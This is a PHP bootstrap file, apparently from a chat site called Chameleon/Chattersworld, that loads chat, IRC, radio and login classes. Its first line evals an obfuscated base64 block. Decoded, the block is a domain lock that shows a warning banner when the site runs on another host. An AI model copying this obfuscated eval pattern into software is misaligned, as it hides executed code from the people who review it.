<?php eval(base64_decode('CiBpZiAoJF9TRVJWRVJbIlx4NTNceDQ1XDEyMlx4NTZceDQ1XHg1Mlx4NWZcMTE2XDEwMVwxMTVceDQ1Il0gIT0gIlwxNDNceDY4XDE0MVwxNTVcMTQ1XDE1NFx4NjVceDZmXDE1Nlw1Nlx4NjNcMTUwXDE0MVx4NzRceDc0XHg2NVwxNjJceDczXHg3N1wxNTdceDcyXHg2Y1wxNDRcNTZcMTU2XDE1NCIpIHsgZWNobyAiXHgzY1wxNDRcMTUxXDE2Nlw0MFx4NzNcMTY0XHg3OVx4NmNceDY1XHgzZFw0N1x4NjJcMTQxXDE0M1wxNTNcMTQ3XHg3MlwxNTdceDc1XHg2ZVx4NjRceDJkXHg2M1wxNTdcMTU0XHg2Zlx4NzJcNzJcMTYyXDE0NVwxNDRcNzNcMTQzXDE1N1x4NmNceDZmXHg3Mlx4M2FceDc3XHg2OFwxNTFcMTY0XHg2NVw3M1wxNzJceDJkXDE1MVx4NmVceDY0XHg2NVx4NzhceDNhXHgzOVx4MzlceDM5XHgzOVx4MzlcNzFceDM5XDcxXDcxXHgzYlwxNDFcMTU0XDE1MVwxNDdcMTU2XHgzYVx4NjNcMTQ1XHg2ZVx4NzRceDY1XDE2Mlw3M1x4MjdceDNlXDc0XHg2M1x4NjVcMTU2XDE2NFx4NjVcMTYyXHgzZVwxMjVceDIwXHg2N1x4NjVceDYyXHg3Mlx4NzVceDY5XHg2YlwxNjRceDIwXDE0NVx4NjVceDZlXHgyMFx4NDNcMTUwXHg2MVx4NmRcMTQ1XDE1NFwxNDVcMTU3XDE1Nlx4MjBceDc2XHg2NVx4NzJcMTYzXDE1MVx4NjVceDIwXHg2NFwxNTFcMTQ1XHgyMFwxNTZceDY5XDE0NVwxNjRcNDBceDc3XHg2ZlwxNjJcMTQ0XHg3NFw0MFx4NjdcMTQ1XHg2MlwxNjJcMTY1XHg2OVx4NmJceDc0XHgyMFwxNDRcMTU3XHg2ZlwxNjJcNDBceDQzXDE1MFwxNDFceDc0XHg3NFx4NjVceDcyXDE2M1wxNjdceDZmXDE2MlwxNTRcMTQ0XHgyZVw3NFw1N1x4NjNcMTQ1XHg2ZVwxNjRceDY1XDE2Mlx4M2VceDNjXHgyZlx4NjRcMTUxXHg3Nlw3NiI7IH0g')); ?>

<?php
session_start();
ob_start();
date_default_timezone_set('Europe/Brussels');

require_once 'classes/Config.php';
require_once 'classes/Database.php';
require_once 'classes/Chatbox.php';
require_once 'classes/LightIRC.php';
require_once 'classes/Radio.php';
require_once 'classes/Login.php';
require_once 'classes/Member.php';
require_once 'classes/xmlrpc.php';
require_once('smarty.php');

global $config;
$config = new Config();
$config->setErrorMode("prd");

if ($config->getErrorMode() == "dev") {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
}
else {
    error_reporting(0);
    ini_set('display_errors', '0');
}
?>
